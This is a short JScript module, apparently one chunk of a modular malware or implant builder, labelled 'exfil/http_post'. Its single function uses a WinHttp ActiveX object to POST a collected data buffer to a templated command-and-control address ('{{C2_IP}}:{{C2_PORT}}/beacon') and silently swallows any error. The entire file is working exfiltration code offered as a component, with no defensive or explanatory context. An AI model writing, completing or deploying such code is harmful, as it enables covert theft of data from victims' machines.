// chunk: exfil/http_post
// depends: core/emit_buffer
// provides: exfil_http
// format: jscript

function exfil_http() {
    try {
        var h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        h.Open("POST", "http://{{C2_IP}}:{{C2_PORT}}/beacon", false);
        h.SetRequestHeader("Content-Type", "application/octet-stream");
        h.Send(_buf);
    } catch(ex) {}
}
